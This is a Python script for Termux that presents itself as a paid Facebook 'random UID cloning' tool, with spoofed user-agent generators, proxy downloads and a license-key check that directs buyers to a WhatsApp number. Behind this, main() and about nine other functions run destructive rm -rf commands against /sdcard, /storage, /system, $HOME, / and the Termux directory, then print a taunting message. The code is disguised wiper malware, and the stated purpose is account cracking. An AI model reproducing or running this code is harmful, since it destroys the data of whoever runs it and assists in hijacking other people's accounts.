import os

try:

    import requests

except ImportError:

    print('\n [×] Modul requests belum terinstall!...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [×] Modul Futures belum terinstall!...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [×] Modul Bs4 belum terinstall!...\n')

    os.system('pip install bs4')

import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess

from concurrent.futures import ThreadPoolExecutor as YayanGanteng

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

waktu = '%s %s %s'%(ha,op,ta)

waktu.split('/')

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]

Apk = []

ok = []

cp = []

id = []

user = []

loop = 0

import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]
def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ['https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all']
#	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
def get_proxy_socks4():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open("data/prox_socks4.txt",'w').write(proxf)
	except requests.exceptions.ConnectionError:
		kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
		os.sys.exit()

try:

    prox= requests.get('https://raw.githubusercontent.com/MAHADI-143/BDMC/main/.prox.txt').text

    open('.prox.txt','w').write(prox)

except Exception as e:
	os.system ("clear")
prox=open('.prox.txt','r').read().splitlines()
def buat_ugen(self):
		global ugen_
	#	{str(rc(aZ))}
	#	{str(rr(111,999))}
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']


		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"UserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
				#A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
				#B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
				#C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
				A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
#				A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
#				B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
				C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
				D_ = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
				E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'


				F_ = f'{A_}{C_}{D_}{E_}'
				if F_ in ugen_:pass
				else:ugen_.append(F_)
#				F_ = f'{A__}{C_}{D_}{E_}'
#				if F_ in ugen_:pass
#				else:ugen_.append(F_)
    

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='Nokia'

    e=random.randrange(100, 9999)

    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='Mobile Safari/535.1'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)
        
logo ="""\033[1;97m_______      ________         ________  
/       \      /        |     /  |   /  |        /      \ 
$$$$$$$  |     $$$$$$$$/      $$ |   $$ |       /$$$$$$  |
$$ |__$$ | ______ $$ | ______ $$ |   $$ |______ $$ |  $$/ 
$$    $$< /      |$$ |/      |$$  \ /$$//      |$$ |      
$$$$$$$  |$$$$$$/ $$ |$$$$$$/  $$  /$$/ $$$$$$/ $$ |   __ 
$$ |__$$ |        $$ |          $$ $$/          $$ \__/  |
$$    $$/         $$ |           $$$/           $$    $$/ 
$$$$$$$/          $$/             $/             $$$$$$/
\033[1;97m     
\033[1;97m           
\033[1;97m         
\033[1;97m    
\033[1;97m     
\033[1;97m          
\033[1;97m        
--------------------------------------------------
 Owner    : MEHEDI HASAN TONU
 Team     :B-T-V-C
 TOOL     : RANDOM UID CLONING
 Version  : 6.1
--------------------------------------------------
Turn on & off flight (airplane) mode before use
--------------------------------------------------
PAID COMMAND UPDATE AFTER TWO DAYS 
--------------------------------------------------"""
naim="=Mehedi Hasan Tonu="

myid=uuid.uuid4().hex[:100].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'w')
	kok.write(myid+naim)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.131756phpo-cov', 'r').read()
	os.system('clear')
	print(logo)
	r1=requests.get("https://github.com/ahmad77412/axi/blob/main/xx.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		main()
	else:
		os.system("clear")
		print(logo)
		print("\t    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32mFirst Get Approvel\033[1;37m ")
		
		os.system("clear")
		print(logo)
		print(f"                     {H}YOUR {H}KEY{H} [{H}{H}]{H}")
		print("%s\033[1;32m[+]--------------------------------------------------%s"%(B,P))
		print("   \033[1;33m  BRO TOOL IS PAID")
		print("    \033[1;34m CAN'T TRY TO BYPSSS OTHER WISE YOURS DATA FUR ")
		print("    \033[1;35m SEND 350 EASYPAISA AND THEN SEND KEY ON WHATSAPP")
		print (f"    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32mYour Key â¬‡ðŸ‘‡â¬‡\n\n    {warna}"+naim+key1)
		input("    \033[1;37m[\033[1;32mâœ“\033[1;37m]\033[1;32m\033[1;32mEnter To Send Key")
		time.sleep(3.5)
		tks = '*ASALAMUALIKUM*%2C%20*print-TONU-SIR*%20*I*%20*BUY*%20*RS350EASYPAISA*%20*YOUR*%20*AXI*%20*NEW*%20*---*%20*TOOL*%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*:*'+naim+''+key1
		os.system('xdg-open  https://wa.me/+8801759916221?text='+tks)
		Subscraption()

def files():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
    
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
def approved():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
    
def Bye():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
def main():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
    
def koto():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
    
def mainmenu():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} AXI{P}')
    
def KING():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} AXI{P}');time.sleep(2)
def fuck():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} AXI{P}');time.sleep(2)
    
def FB_KING():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
